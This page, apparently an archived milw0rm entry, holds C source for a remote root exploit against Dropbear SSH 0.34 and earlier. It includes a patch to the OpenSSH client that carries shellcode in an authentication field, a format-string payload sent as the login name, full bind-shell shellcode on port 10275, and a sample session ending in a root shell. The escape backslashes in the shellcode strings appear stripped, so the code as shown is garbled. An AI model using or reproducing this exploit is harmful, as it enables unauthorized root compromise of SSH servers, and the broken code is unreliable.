<html><head><title>Dropbear SSH <= 0.34 Remote Root Exploit</title></head><pre>/* 
* Linux x86 Dropbear SSH &lt;= 0.34 remote root exploit 
* coded by live 
* 
* You'll need a hacked ssh client to try this out. I included a patch 
* to openssh-3.6.p1 somewhere below this comment. 
* 
* The point is: the buffer being exploited is too small(25 bytes) to hold our 
* shellcode, so a workaround was needed in order to send it. What I did here 
* was to hack the ssh client so that it sends the local   environment variable 
* SHELLCODE as ssh's methodname string.   This method   was described by Joel 
* Eriksson @ 0xbadc0ded.org. 
* 
* The 25 bytes limitation is also the reason for the the strange ``2 byte'' 
* retaddr you will see here. That's not enough for complete pointer overwrite, 
* so I decided to   overwrite 3rd and 2nd   bytes and hope our   shellcode is 
* around ;) 
*   
* % telnet localhost 22 
* Trying 127.0.0.1... 
* Connected to localhost. 
* Escape character is '^]'. 
* SSH-2.0-dropbear_0.34 
* ^] 
* telnet&gt; quit 
* Connection closed. 
* 
* % objdump -R /usr/local/sbin/dropbear| grep malloc 
* 080673bc R_386_JUMP_SLOT   malloc 
* 
* % drop-root -v24 localhost 
* ?.2022u%24$hn@localhost's password: 
* Connection closed by 127.0.0.1 
* 
* % telnet localhost 10275 
* Trying 127.0.0.1... 
* Connected to localhost. 
* Escape character is '^]'. 
* id; exit; 
* uid=0(root) gid=0(root) groups=0(root) 
* Connection closed by foreign host. 
* 
* In the above example we were able to lookup a suitable .got entry(used as 
* retloc here), but this may not be true under a hostile environment. If 
* exploiting this remotely I feel like chances would be greater if we attack 
* the stack, but that's just a guess. 
* 
* Version pad is 24 to 0.34, 12 to 0.32. I don't know about other versions. 
* 
* gr33tz: ppro, alcaloide and friends. 
* 
* 21.08.2003 
* Please do not distribute 
*/ 



/* 

--- sshconnect2.c2003-08-21 21:34:03.000000000 -0300 
+++ sshconnect2.c.hack2003-08-21 21:33:47.000000000 -0300 
@@ -278,6 +278,8 @@ 
void 
userauth(Authctxt *authctxt, char *authlist) 
{ 
+     char *shellcode = getenv(&quot;SHELLCODE&quot;); 
+ 
if (authlist == NULL) { 
authlist = authctxt-&gt;authlist; 
} else { 
@@ -290,6 +292,7 @@ 
if (method == NULL) 
fatal(&quot;Permission denied (%s).&quot;, authlist); 
authctxt-&gt;method = method; 
+         authctxt-&gt;method-&gt;name = shellcode; 
if (method-&gt;userauth(authctxt) != 0) { 
debug2(&quot;we sent a %s packet, wait for reply&quot;, method-&gt;name); 
break; 

*/ 


#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;unistd.h&gt; 
#include &lt;string.h&gt; 


#define SSH_PATH               &quot;ssh&quot; 
#define SSH_PORT               &quot;22&quot; 

#define DEFAULT_VERSION_PAD     24 
#define DEFAULT_RETLOC         0xbffff800 
#define DEFAULT_RETADDR         0x080e /* 2 byte retaddr, not enough space for a 
                                      * full overwrite. */ 


/* fork/bind shellcode by live 
* default port is 10275 
* 
* I believe this can be futher optmized, but size is not 
* an issue here since we are sending the shellcode through 
* a ssh variable which is about 30k bytes long. 
*/ 
char shellcode[] = 
    &quot;x31xc0&quot;                       /* xor     %eax,%eax               */ 
    &quot;xb0x02&quot;                       /* mov     $0x2,%al                 */ 
    &quot;xcdx80&quot;                       /* int     $0x80                   */ 
    &quot;x85xc0&quot;                       /* test   %eax,%eax               */ 
    &quot;x75x54&quot;                       /* jne     5e                       */ 
    &quot;xebx50&quot;                       /* jmp     5c                       */ 
    &quot;x5e&quot;                           /* pop     %esi                     */ 
    &quot;x31xc0&quot;                       /* xor     %eax,%eax               */ 
    &quot;x31xdb&quot;                       /* xor     %ebx,%ebx               */ 
    &quot;x89x46x08&quot;                   /* mov     %eax,0x8(%esi)           */ 
    &quot;xb0x02&quot;                       /* mov     $0x2,%al                 */ 
    &quot;x89x06&quot;                       /* mov     %eax,(%esi)             */ 
    &quot;xfexc8&quot;                       /* dec     %al                     */ 
    &quot;x89x46x04&quot;                   /* mov     %eax,0x4(%esi)           */ 
    &quot;xb0x66&quot;                       /* mov     $0x66,%al               */ 
    &quot;xfexc3&quot;                       /* inc     %bl                     */ 
    &quot;x89xf1&quot;                       /* mov     %esi,%ecx               */ 
    &quot;xcdx80&quot;                       /* int     $0x80                   */ 
    &quot;x89x06&quot;                       /* mov     %eax,(%esi)             */ 
    &quot;x89x4ex04&quot;                   /* mov     %ecx,0x4(%esi)           */ 
    &quot;x80x46x04x0c&quot;               /* addb   $0xc,0x4(%esi)           */ 
    &quot;x31xc0&quot;                       /* xor     %eax,%eax               */ 
    &quot;xb0x10&quot;                       /* mov     $0x10,%al               */ 
    &quot;x89x46x08&quot;                   /* mov     %eax,0x8(%esi)           */ 
    &quot;xb0x02&quot;                       /* mov     $0x2,%al                 */ 
    &quot;x66x89x46x0c&quot;               /* mov     %ax,0xc(%esi)           */ 
    &quot;x66xb8x28x23&quot;               /* mov     $0x2328,%ax             */ 
    &quot;x89x46x0e&quot;                   /* mov     %eax,0xe(%esi)           */ 
    &quot;x31xc0&quot;                       /* xor     %eax,%eax               */ 
    &quot;x89x46x10&quot;                   /* mov     %eax,0x10(%esi)         */ 
    &quot;xb0x66&quot;                       /* mov     $0x66,%al               */ 
    &quot;xfexc3&quot;                       /* inc     %bl                     */ 
    &quot;xcdx80&quot;                       /* int     $0x80                   */ 
    &quot;xfexcb&quot;                       /* dec     %bl                     */ 
    &quot;x89x5ex04&quot;                   /* mov     %ebx,0x4(%esi)           */ 
    &quot;x31xc0&quot;                       /* xor     %eax,%eax               */ 
    &quot;xb0x66&quot;                       /* mov     $0x66,%al               */ 
    &quot;xb3x04&quot;                       /* mov     $0x4,%bl                 */ 
    &quot;xcdx80&quot;                       /* int     $0x80                   */ 
    &quot;xebx04&quot;                       /* jmp     60                       */ 
    &quot;xebx44&quot;                       /* jmp     a2                       */ 
    &quot;xebx3a&quot;                       /* jmp     9a                       */ 
    &quot;x31xc0&quot;                       /* xor     %eax,%eax               */ 
    &quot;x89x46x04&quot;                   /* mov     %eax,0x4(%esi)           */ 
    &quot;x89x46x08&quot;                   /* mov     %eax,0x8(%esi)           */ 
    &quot;xb0x66&quot;                       /* mov     $0x66,%al               */ 
    &quot;xfexc3&quot;                       /* inc     %bl                     */ 
    &quot;xcdx80&quot;                       /* int     $0x80                   */ 
    &quot;x31xc9&quot;                       /* xor     %ecx,%ecx               */ 
    &quot;x89xc3&quot;                       /* mov     %eax,%ebx               */ 
    &quot;x31xc0&quot;                       /* xor     %eax,%eax               */ 
    &quot;xb0x3f&quot;                       /* mov     $0x3f,%al               */ 
    &quot;xcdx80&quot;                       /* int     $0x80                   */ 
    &quot;xfexc1&quot;                       /* inc     %cl                     */ 
    &quot;x80xf9x03&quot;                   /* cmp     $0x3,%cl                 */ 
    &quot;x75xf3&quot;                       /* jne     72                       */ 
    &quot;x68x2fx2fx73x68&quot;           /* push   $0x68732f2f             */ 
    &quot;x68x2fx62x69x6e&quot;           /* push   $0x6e69622f             */ 
    &quot;x89xe3&quot;                       /* mov     %esp,%ebx               */ 
    &quot;x31xc0&quot;                       /* xor     %eax,%eax               */ 
    &quot;x88x43x08&quot;                   /* mov     %al,0x8(%ebx)           */ 
    &quot;x50&quot;                           /* push   %eax                     */ 
    &quot;x53&quot;                           /* push   %ebx                     */ 
    &quot;x89xe1&quot;                       /* mov     %esp,%ecx               */ 
    &quot;x89xe2&quot;                       /* mov     %esp,%edx               */ 
    &quot;xb0x0b&quot;                       /* mov     $0xb,%al                 */ 
    &quot;xcdx80&quot;                       /* int     $0x80                   */ 
    &quot;x31xc0&quot;                       /* xor     %eax,%eax               */ 
    &quot;x31xdb&quot;                       /* xor     %ebx,%ebx               */ 
    &quot;xfexc0&quot;                       /* inc     %al                     */ 
    &quot;xcdx80&quot;                       /* int     $0x80                   */ 
    &quot;xe8x65xffxffxff&quot;           /* call   c &lt;up&gt;                   */ 
; 


static void usage(const char *progname); 


int 
main(int argc, char *argv[]) 
{ 
    char buffer[29500], fmt[26], *target; 
    long int retloc, retaddr; 
    int ch, version_pad; 

    retloc           = DEFAULT_RETLOC +1; 
    retaddr         = DEFAULT_RETADDR -40; 
    version_pad     = DEFAULT_VERSION_PAD; 

    while ( (ch = getopt(argc, argv, &quot;l:r:v:&quot;)) != -1) { 
        switch (ch) { 
            case 'l': 
                retloc += atoi(optarg) *4; 
                break; 
            case 'r': 
                retaddr += atoi(optarg) *4; 
                break; 
            case 'v': 
                version_pad = atoi(optarg); 
                break; 
        } 
    } 

    if (argc -optind != 1) { 
        usage(argv[0]); 
        exit(-1); 
    } 

    argc -= optind; 
    argv += optind; 

    target = argv[0]; 
    memset(buffer, 0x90, 29500); 
    memcpy(buffer +29500 -strlen(shellcode), shellcode, strlen(shellcode)); 
    memcpy(buffer, &quot;SHELLCODE=&quot;, 10); 

    putenv(buffer); 
    snprintf(fmt, sizeof fmt, &quot;%c%c%c%c%%.%du%%%d$hn&quot;, 
        (retloc &amp; 0xff), 
        (retloc &amp; 0xff00) &gt;&gt; 8, 
        (retloc &amp; 0xff0000) &gt;&gt; 16, 
        (retloc &amp; 0xff000000) &gt;&gt; 24, 
        retaddr, 
        version_pad); 

    execl(SSH_PATH, &quot;ssh&quot;, &quot;-l&quot;, fmt, &quot;-p&quot;, SSH_PORT, target, NULL); 
    exit(0); 
} 


static void 
usage(const char *progname) { 
    fprintf(stderr, &quot;Linux x86 Dropbear SSH &lt;= 0.34 remote root exploitn&quot;); 
    fprintf(stderr, &quot;coded by livenn&quot;); 
    fprintf(stderr, &quot;Usage: %s [-l &lt;retloc offset&gt;] [-r &lt;retaddr offset&gt;]&quot; 
        &quot; [-v &lt;version pad&gt;] &lt;target&gt;n&quot;, progname); 
}

// milw0rm.com [2004-08-09]</pre></html>